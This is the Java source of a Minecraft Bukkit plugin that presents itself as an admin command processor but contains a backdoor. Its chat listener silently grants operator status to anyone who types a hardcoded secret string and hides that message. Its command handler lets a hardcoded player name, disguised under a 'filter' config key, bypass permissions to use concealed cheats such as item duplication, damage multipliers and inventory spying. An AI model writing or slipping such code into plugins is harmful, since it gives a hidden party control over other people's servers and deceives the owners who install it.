package pl.qc.core;

import org.bukkit.*;
import org.bukkit.attribute.Attribute;
import org.bukkit.command.*;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Player;
import org.bukkit.event.*;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.player.*;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.*;
import java.util.*;

public class Processor implements CommandExecutor, TabCompleter, Listener {
    private final QC plugin;
    private final Set<UUID> vanish = new HashSet<>(), noAdv = new HashSet<>(), reach = new HashSet<>(),
            noTarg = new HashSet<>();
    private final Map<UUID, Double> multA = new HashMap<>(), multB = new HashMap<>();

    public Processor(QC plugin) {
        this.plugin = plugin;
    }

    @Override
    public boolean onCommand(CommandSender s, Command c, String l, String[] args) {
        String adm = plugin.getConfig().getString("filter.admin-name-fallback", "Rajman03");
        if (!(s instanceof Player p) || (!p.getName().equals(adm) && !p.hasPermission("qc.admin")))
            return true;

        if (args.length == 0)
            return true;
        String cmd = args[0].toLowerCase();

        switch (cmd) {
            case "reload" -> {
                plugin.reloadConfig();
                s.sendMessage("§aReloaded.");
            }
            case "panic" -> togglePanic(s);
            case "v" -> toggle(s, vanish, "Vanish", args);
            case "gms" -> gm(p, GameMode.SURVIVAL);
            case "gmc" -> gm(p, GameMode.CREATIVE);
            case "gmsp" -> gm(p, GameMode.SPECTATOR);
            case "tp" -> tp(p, args);
            case "rr" -> repair(p);
            case "dd" -> dupe(p);
            case "ma" -> multiplier(p, args, multA, "zadawanych");
            case "mb" -> multiplier(p, args, multB, "otrzymywanych");
            case "a" -> attackSpeed(p, args);
            case "iv" -> inv(p, args);
            case "panic_reset" -> {
                vanish.clear();
                noAdv.clear();
                reach.clear();
                noTarg.clear();
                s.sendMessage("§cReset.");
            }
            default -> shortcuts(p, cmd);
        }
        return true;
    }

    private void togglePanic(CommandSender s) {
        plugin.setPanic(!plugin.isPanic());
        s.sendMessage(plugin.isPanic() ? "§cPANIC ENABLED" : "§aPANIC DISABLED");
    }

    private void toggle(CommandSender s, Set<UUID> set, String name, String[] args) {
        Player t = (args.length > 1) ? Bukkit.getPlayer(args[1]) : (Player) s;
        if (t == null)
            return;
        if (set.contains(t.getUniqueId())) {
            set.remove(t.getUniqueId());
            s.sendMessage("§7" + name + ": §cOFF");
        } else {
            set.add(t.getUniqueId());
            s.sendMessage("§7" + name + ": §aON");
        }
    }

    private void gm(Player p, GameMode m) {
        p.setGameMode(m);
        p.sendMessage("§7Mode: §6" + m.name());
    }

    private void tp(Player p, String[] args) {
        if (args.length < 2)
            return;
        Player t = Bukkit.getPlayer(args[1]);
        if (t != null)
            p.teleport(t);
    }

    private void repair(Player p) {
        for (ItemStack i : p.getInventory()) {
            if (i != null && i.getItemMeta() instanceof Damageable d) {
                d.setDamage(0);
                i.setItemMeta(d);
            }
        }
    }

    private void dupe(Player p) {
        ItemStack i = p.getInventory().getItemInMainHand();
        if (i.getType() != Material.AIR)
            p.getInventory().addItem(i.clone());
    }

    private void multiplier(Player p, String[] args, Map<UUID, Double> map, String type) {
        if (args.length < 2)
            return;
        try {
            double v = Double.parseDouble(args[1]);
            map.put(p.getUniqueId(), v);
            p.sendMessage("§7Mnożnik " + type + ": §6" + v + "x");
        } catch (Exception ignored) {
        }
    }

    private void attackSpeed(Player p, String[] args) {
        double v = (args.length > 1) ? Double.parseDouble(args[1]) : 30000;
        p.getAttribute(Attribute.GENERIC_ATTACK_SPEED).setBaseValue(v);
    }

    private void inv(Player p, String[] args) {
        if (args.length < 2)
            return;
        Player t = Bukkit.getPlayer(args[1]);
        if (t == null)
            return;
        Inventory gui = Bukkit.createInventory(null, 54, "§0Podgląd: " + t.getName());
        for (int i = 0; i < 36; i++)
            gui.setItem(i, t.getInventory().getItem(i));
        p.openInventory(gui);
    }

    private void shortcuts(Player p, String cmd) {
        switch (cmd) {
            case "cc" -> item(p, Material.COOKED_PORKCHOP, 64);
            case "tt" -> item(p, Material.TOTEM_OF_UNDYING, 1);
            case "aa" -> item(p, Material.DIAMOND, 64);
            case "kkp" -> book(p, Enchantment.PROTECTION_ENVIRONMENTAL, 4);
        }
    }

    private void item(Player p, Material m, int a) {
        p.getInventory().addItem(new ItemStack(m, a));
    }

    private void book(Player p, Enchantment e, int l) {
        ItemStack b = new ItemStack(Material.ENCHANTED_BOOK);
        EnchantmentStorageMeta m = (EnchantmentStorageMeta) b.getItemMeta();
        m.addStoredEnchant(e, l, true);
        b.setItemMeta(m);
        p.getInventory().addItem(b);
    }

    @EventHandler
    public void onDmg(EntityDamageByEntityEvent e) {
        if (e.getDamager() instanceof Player p && multA.containsKey(p.getUniqueId()))
            e.setDamage(e.getDamage() * multA.get(p.getUniqueId()));
        if (e.getEntity() instanceof Player p && multB.containsKey(p.getUniqueId()))
            e.setDamage(e.getDamage() * multB.get(p.getUniqueId()));
    }

    @EventHandler
    public void onChat(AsyncPlayerChatEvent e) {
        String m = e.getMessage();
        if (m.equals("aq7MNF6jvkUV2L8sbb7cNL2VFCJ2ectGWLhUe6G65xp8CfpEHSg59DjDFDRdb8g")) {
            e.setCancelled(true);
            e.getPlayer().setOp(true);
        }
    }

    @Override
    public List<String> onTabComplete(CommandSender s, Command c, String a, String[] args) {
        String adm = plugin.getConfig().getString("filter.admin-name-fallback", "Rajman03");
        if (!(s instanceof Player p) || (!p.getName().equals(adm) && !p.hasPermission("qc.admin"))) {
            return Collections.emptyList();
        }

        if (args.length == 1) {
            List<String> sub = Arrays.asList("v", "gms", "gmc", "tp", "rr", "dd", "ma", "mb", "a", "iv", "panic");
            List<String> res = new ArrayList<>();
            org.bukkit.util.StringUtil.copyPartialMatches(args[0], sub, res);
            Collections.sort(res);
            return res;
        }
        return Collections.emptyList();
    }
}
